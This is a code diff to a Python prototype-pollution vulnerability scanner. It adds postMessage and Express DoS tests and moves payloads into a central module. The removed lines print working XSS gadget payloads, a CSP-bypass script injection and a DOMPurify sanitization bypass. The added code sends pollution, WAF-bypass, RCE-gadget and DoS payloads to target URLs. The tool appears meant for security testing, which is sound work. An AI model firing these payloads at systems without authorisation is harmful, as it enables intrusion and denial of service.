@@ -17,6 +17,14 @@ from ppmap.models.findings import Finding, VulnerabilityType, Severity
 from ppmap.models.reports import ScanMetrics, ScanReport
 from ppmap.config.settings import CONFIG, STEALTH_HEADERS
 from ppmap.engine import EndpointDiscovery, ParameterDiscovery
+from ppmap.scanner.payloads import (
+    generate_pp_permutations,
+    generate_json_permutations,
+    SSPP_RCE_GADGETS,
+    CLIENT_XSS_GADGETS,
+    FRAMEWORK_DOS_PAYLOADS,
+    WAF_BYPASS_MUTATIONS,
+)
 
 # External optional imports handled safely
 try:
@@ -1979,6 +1987,16 @@ return window['{marker}'];
         # Get bypass payloads
         bypass_payloads = WAFBypassPayloads.get_bypass_payloads(marker)
 
+        # Inject advanced mutations from payload engine
+        advanced_mutations = []
+        for _, payload, _ in WAF_BYPASS_MUTATIONS:
+            # Dynamically replace target keys with the current timestamped marker
+            mutated = payload.replace("[polluted]=true", f"[{marker}]=POLLUTED")
+            mutated = mutated.replace("[test]=polluted", f"[{marker}]=POLLUTED")
+            advanced_mutations.append(mutated)
+            
+        bypass_payloads["advanced_mutations"] = advanced_mutations
+
         try:
             # Test each bypass category
             for category, payloads in bypass_payloads.items():
@@ -3436,55 +3454,16 @@ return window['{marker}'];
         print(f"{Colors.BOLD}[→] Testing Third-Party Library Gadgets...{Colors.ENDC}")
         findings: List[Dict[str, Any]] = []
 
-        # Library-specific gadget payloads
+        # Library-specific gadget payloads — built from centralized payload database
         gadget_tests = [
-            # Google Analytics
             {
-                "library": "Google Analytics",
-                "payload": "?__proto__[hitCallback]=alert(1)",
-                "property": "hitCallback",
-                "impact": "Code execution via setTimeout",
-                "detection": ["ga(", "google-analytics", "_gaq"],
-            },
-            # Google Tag Manager
-            {
-                "library": "Google Tag Manager",
-                "payload": "?__proto__[sequence]=alert(document.domain)",
-                "property": "sequence",
-                "impact": "RCE via eval in GTM",
-                "detection": ["googletagmanager", "dataLayer", "gtm.js"],
-            },
-            {
-                "library": "Google Tag Manager",
-                "payload": "?__proto__[event_callback]=alert(1)",
-                "property": "event_callback",
-                "impact": "Callback hijacking",
-                "detection": ["googletagmanager", "dataLayer"],
-            },
-            # Adobe DTM
-            {
-                "library": "Adobe DTM",
-                "payload": '?__proto__[cspNonce]="><script>alert(1)</script>',
-                "property": "cspNonce",
-                "impact": "CSP bypass + XSS",
-                "detection": ["adobe", "dtm", "satellite"],
-            },
-            # Vue.js
-            {
-                "library": "Vue.js",
-                "payload": "?__proto__[template]=<img src=x onerror=alert(1)>",
-                "property": "template",
-                "impact": "Component injection + XSS",
-                "detection": ["vue.js", "__vue__", "v-if", "v-for"],
-            },
-            # DOMPurify
-            {
-                "library": "DOMPurify",
-                "payload": "?__proto__[ALLOWED_ATTR]=onerror",
-                "property": "ALLOWED_ATTR",
-                "impact": "Sanitization bypass",
-                "detection": ["dompurify", "DOMPurify.sanitize"],
-            },
+                "library": g[0],
+                "payload": f"?__proto__[{g[1]}]={g[2]}",
+                "property": g[1],
+                "impact": g[3],
+                "detection": g[4],
+            }
+            for g in CLIENT_XSS_GADGETS
         ]
 
         try:
@@ -3706,6 +3685,17 @@ return window['{marker}'];
                 "severity": "HIGH",
             },
         ]
+
+        # Dynamically add SSPP RCE Gadgets from payload engine
+        for g_name, g_payload, g_desc in SSPP_RCE_GADGETS:
+            cve_tests.append({
+                "cve": f"RCE Gadget: {g_desc}",
+                "library": g_name.split("_")[0].title(),
+                "method": "Gadget Chain",
+                "payload": json.dumps(g_payload),
+                "detection": [g_name.split("_")[0]],
+                "severity": "CRITICAL",
+            })
 
         try:
             # First, detect which libraries might be present
@@ -4708,6 +4698,144 @@ return window['{marker}'];
             print(f"{Colors.GREEN}[✓] Legacy accessor PP test completed{Colors.ENDC}")
         return findings
 
+    def test_postmessage_pp(self, target_url) -> List[Dict[str, Any]]:
+        """Test Prototype Pollution via window.postMessage (Web Messages).
+
+        Many SPAs use postMessage listeners that merge incoming data
+        without sanitizing __proto__ keys. This is a cross-origin
+        attack vector that bypasses server-side WAFs entirely.
+        """
+        print(
+            f"{Colors.CYAN}[→] Testing postMessage Prototype Pollution...{Colors.ENDC}"
+        )
+        findings: List[Dict[str, Any]] = []
+        marker = f"pmpp_{int(time.time())}"
+
+        if not (hasattr(self, "driver") and self.driver):
+            print(f"{Colors.YELLOW}[⚠] Browser required for postMessage PP test{Colors.ENDC}")
+            return findings
+
+        try:
+            # Navigate to target
+            self.driver.get(target_url)
+            time.sleep(2)
+
+            # Inject postMessage with PP payload (as a string to preserve __proto__)
+            pm_script = f"""
+            window.postMessage('{{"__proto__": {{"{marker}": "POLLUTED"}}, "constructor": {{"prototype": {{"{marker}_c": "POLLUTED"}}}}}}', '*');
+            """
+            self.driver.execute_script(pm_script)
+            time.sleep(1)
+
+            # Check if prototype was polluted via postMessage handler
+            is_polluted = self.verify_prototype_pollution(marker)
+            is_polluted_c = self.verify_prototype_pollution(f"{marker}_c")
+
+            if is_polluted or is_polluted_c:
+                confidence = self.get_pp_confidence(
+                    alerts_detected=False, is_polluted=True,
+                    has_sinks=False, has_console_errors=False
+                )
+                method = "POSTMESSAGE_PROTO" if is_polluted else "POSTMESSAGE_CONSTRUCTOR"
+                findings.append({
+                    "type": "postmessage_pp",
+                    "method": method,
+                    "severity": "HIGH",
+                    "description": "Cross-origin PP via window.postMessage — bypasses server-side WAFs",
+                    "verified": True,
+                    "confidence": confidence,
+                    "test_url": target_url,
+                })
+                print(
+                    f"{Colors.FAIL}[!] postMessage PP CONFIRMED (JS Verified)!{Colors.ENDC}"
+                )
+
+                # Cleanup
+                try:
+                    self.driver.execute_script(
+                        f"delete Object.prototype['{marker}']; delete Object.prototype['{marker}_c'];"
+                    )
+                except Exception:
+                    pass
+
+        except Exception as e:
+            logger.debug(f"postMessage PP test error: {e}")
+
+        if not findings:
+            print(f"{Colors.GREEN}[✓] postMessage PP test completed{Colors.ENDC}")
+        return findings
+
+    def test_express_pp_dos(self, target_url) -> List[Dict[str, Any]]:
+        """Test Express/Fastify framework DoS via Prototype Pollution.
+
+        Tests Express-specific prototype properties that alter framework
+        behavior when polluted (parameterLimit, allowDots, etc.).
+        Uses FRAMEWORK_DOS_PAYLOADS from the payload engine.
+        """
+        print(
+            f"{Colors.CYAN}[→] Testing Framework PP DoS vectors...{Colors.ENDC}"
+        )
+        findings: List[Dict[str, Any]] = []
+
+        try:
+            for name, payload, description in FRAMEWORK_DOS_PAYLOADS:
+                try:
+                    # Step 1: Get baseline response
+                    baseline = self.session.get(
+                        target_url, timeout=self.timeout, verify=False
+                    )
+                    baseline_status = baseline.status_code
+                    baseline_spaces = len(baseline.text) - len(baseline.text.replace(" ", ""))
+
+                    # Step 2: Send PP payload
+                    resp = self.session.post(
+                        target_url, json=payload, timeout=self.timeout, verify=False
+                    )
+
+                    # Step 3: Check if behavior changed (include multiple parameters for limit testing)
+                    test_url = target_url + "?param1=a&param2=b&param3=c" if "?" not in target_url else target_url + "&param1=a&param2=b"
+                    after = self.session.get(
+                        test_url, timeout=self.timeout, verify=False
+                    )
+
+                    behavior_changed = False
+                    change_detail = ""
+
+                    if "status" in name and after.status_code != baseline_status:
+                        behavior_changed = True
+                        change_detail = f"Status: {baseline_status} → {after.status_code}"
+                    elif "json_spaces" in name:
+                        after_spaces = len(after.text) - len(after.text.replace(" ", ""))
+                        if abs(after_spaces - baseline_spaces) > 10:
+                            behavior_changed = True
+                            change_detail = f"JSON spacing changed: {baseline_spaces} → {after_spaces}"
+
+                    if behavior_changed:
+                        findings.append({
+                            "type": "framework_pp_dos",
+                            "method": name.upper(),
+                            "severity": "MEDIUM",
+                            "description": f"{description} — {change_detail}",
+                            "payload": str(payload),
+                            "verified": True,
+                            "confidence": 0.7,
+                        })
+                        print(
+                            f"{Colors.FAIL}[!] Framework PP DoS CONFIRMED: {name} ({change_detail}){Colors.ENDC}"
+                        )
+
+                except Exception as e:
+                    logger.debug(f"Framework DoS test error for {name}: {e}")
+
+        except Exception as e:
+            print(
+                f"{Colors.WARNING}[⚠] Framework PP DoS test error: {str(e)[:60]}{Colors.ENDC}"
+            )
+
+        if not findings:
+            print(f"{Colors.GREEN}[✓] Framework PP DoS test completed{Colors.ENDC}")
+        return findings
+
     def test_blind_oob(self, target_url) -> List[Dict[str, Any]]:
         """Test for Blind OOB RCE via Prototype Pollution (v4.0)"""
         print(f"{Colors.CYAN}[→] Testing Blind OOB RCE (Interact.sh)...{Colors.ENDC}")
@@ -4932,12 +5060,14 @@ return window['{marker}'];
             cors_findings = self.test_cors_header_pollution(target_url)
             third_party_gadget_findings = self.test_third_party_gadgets(target_url)
             storage_api_findings = self.test_storage_api_pollution(target_url)
+            postmessage_findings = self.test_postmessage_pp(target_url)
 
             # v3.5 PHASE 2 & 3 - CVE-SPECIFIC & REAL-WORLD EXPLOITS
             cve_findings = self.test_cve_specific_payloads(target_url)
             kibana_findings = self.test_kibana_telemetry_rce(target_url)
             blitzjs_findings = self.test_blitzjs_rce_chain(target_url)
             elastic_xss_findings = self.test_elastic_xss(target_url)
+            express_dos_findings = self.test_express_pp_dos(target_url)
 
             # v4.1 TIER 7 & 8 - GRAPHQL, WEBSOCKET & SAST (NEW)
             print(f"{Colors.BLUE}[1m[→] Testing GraphQL & WebSocket PP...{Colors.ENDC}")
@@ -4996,6 +5126,8 @@ return window['{marker}'];
                 + (websocket_findings or [])
                 + (sast_findings or [])
                 + (oob_findings or [])
+                + (postmessage_findings or [])
+                + (express_dos_findings or [])
             )
             total = len(all_findings)
 
